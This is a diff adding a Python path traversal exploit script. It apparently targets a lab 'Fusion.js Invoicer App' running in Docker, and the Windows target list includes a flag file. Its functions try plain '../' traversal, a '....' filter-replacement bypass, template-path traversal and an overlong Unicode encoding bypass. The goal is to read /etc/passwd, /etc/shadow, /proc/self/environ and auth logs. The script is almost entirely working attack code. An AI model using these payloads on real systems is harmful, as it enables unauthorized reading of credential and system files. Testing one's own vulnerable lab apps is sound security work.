@@ -1,0 +1,114 @@
+#!/usr/bin/env python3
+import requests
+import urllib.parse
+
+# Configuration
+BASE_URL = "http://10.0.0.105:3001"  # Docker host IP
+WINDOWS_TARGETS = [
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "C:\\Windows\\win.ini",
+    "C:\\Users\\Administrator\\Desktop\\flag.txt"
+]
+LINUX_TARGETS = [
+    "/etc/passwd",
+    "/etc/shadow",
+    "/proc/self/environ",
+    "/var/log/auth.log"
+]
+
+def test_simple_path_traversal():
+    """Test simple path traversal using path.join"""
+    print("\n[+] Testing Simple Path Traversal")
+    endpoint = f"{BASE_URL}/api/file/read"
+    
+    # Test accessing test.txt (should work)
+    params = {"file": "test.txt"}
+    r = requests.get(endpoint, params=params)
+    print(f"[*] Accessing test.txt: {r.status_code}")
+    if r.status_code == 200:
+        print(f"[*] Content: {r.text.strip()}")
+
+    # Test path traversal
+    for target in LINUX_TARGETS:  # Container is Linux
+        traversal = "../" * 10 + target.lstrip("/")
+        params = {"file": traversal}
+        r = requests.get(endpoint, params=params)
+        print(f"\n[*] Trying to access {target}")
+        print(f"[*] Status: {r.status_code}")
+        if r.status_code == 200:
+            print(f"[*] First few lines:\n{r.text[:200]}")
+
+def test_bypass_replace():
+    """Test path traversal with '../' replacement bypass"""
+    print("\n[+] Testing Bypass Replace Vulnerability")
+    endpoint = f"{BASE_URL}/api/file/secure-read"
+    
+    for target in LINUX_TARGETS:
+        # Use '....' which becomes '../' after replace
+        traversal = "...." * 10 + target.lstrip("/")
+        params = {"filename": traversal}
+        r = requests.get(endpoint, params=params)
+        print(f"\n[*] Trying to access {target}")
+        print(f"[*] Status: {r.status_code}")
+        if r.status_code == 200:
+            print(f"[*] First few lines:\n{r.text[:200]}")
+
+def test_template_traversal():
+    """Test path traversal in template loading"""
+    print("\n[+] Testing Template Path Traversal")
+    endpoint = f"{BASE_URL}/api/file/template"
+    
+    # Test accessing invoice.html (should work)
+    params = {"template": "invoice.html"}
+    r = requests.get(endpoint, params=params)
+    print(f"[*] Accessing invoice.html: {r.status_code}")
+    if r.status_code == 200:
+        print(f"[*] Content: {r.text[:200]}")
+
+    # Test path traversal
+    for target in LINUX_TARGETS:
+        traversal = "../" * 5 + target.lstrip("/")  # Fewer ../ needed as we start in templates/
+        params = {"template": traversal}
+        r = requests.get(endpoint, params=params)
+        print(f"\n[*] Trying to access {target}")
+        print(f"[*] Status: {r.status_code}")
+        if r.status_code == 200:
+            print(f"[*] First few lines:\n{r.text[:200]}")
+
+def test_unicode_bypass():
+    """Test path traversal with Unicode bypass"""
+    print("\n[+] Testing Unicode Bypass")
+    endpoint = f"{BASE_URL}/api/file/read"
+    
+    for target in LINUX_TARGETS:
+        # Use Unicode encoded '../'
+        traversal = "%c0%ae%c0%ae%c0%af" * 5 + target.lstrip("/")
+        params = {"file": traversal}
+        r = requests.get(endpoint, params=params)
+        print(f"\n[*] Trying to access {target} with Unicode bypass")
+        print(f"[*] Status: {r.status_code}")
+        if r.status_code == 200:
+            print(f"[*] First few lines:\n{r.text[:200]}")
+
+def main():
+    print("[+] Path Traversal Vulnerability Tests")
+    print("[+] Target: Fusion.js Invoicer App")
+    
+    try:
+        # Test basic connectivity
+        r = requests.get(f"{BASE_URL}/api/file/read?file=test.txt")
+        if r.status_code != 200:
+            print("[-] Error: Cannot connect to application or test file not found")
+            return
+        
+        # Run all tests
+        test_simple_path_traversal()
+        test_bypass_replace()
+        test_template_traversal()
+        test_unicode_bypass()
+        
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error connecting to application: {e}")
+
+if __name__ == "__main__":
+    main() 
